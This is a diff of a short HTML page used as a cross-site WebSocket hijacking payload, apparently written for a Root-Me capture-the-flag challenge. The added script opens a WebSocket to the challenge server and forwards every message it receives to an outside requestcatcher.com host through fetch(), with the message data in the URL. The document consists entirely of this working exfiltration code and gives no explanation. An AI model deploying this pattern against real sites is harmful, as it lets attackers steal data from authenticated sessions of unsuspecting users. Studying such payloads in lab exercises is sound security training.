@@ -1,18 +1,24 @@
-<!DOCTYPE HTML>
-<html>
-
-  <body>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+</head>
+<body>
     
 
     <script>
-     const connection = new WebSocket('wss://ctf09.root-me.org/ws')
+        const socket = new WebSocket('ws://ctf10.root-me.org/ws')
 
-         connection.onopen = function () {
-            connection.send("hello"); 
-         };  
-        connection.onmessage = function (message) {
-        console.log(message)
-        }
-  </script>
-  </body>
+         socket.onopen = () => {
+
+  socket.send("hello");
+};
+
+socket.onmessage = (event) => {
+  fetch("https://mhyrjyj.requestcatcher.com/" + event.data)
+};
+    </script>
+</body>
 </html>
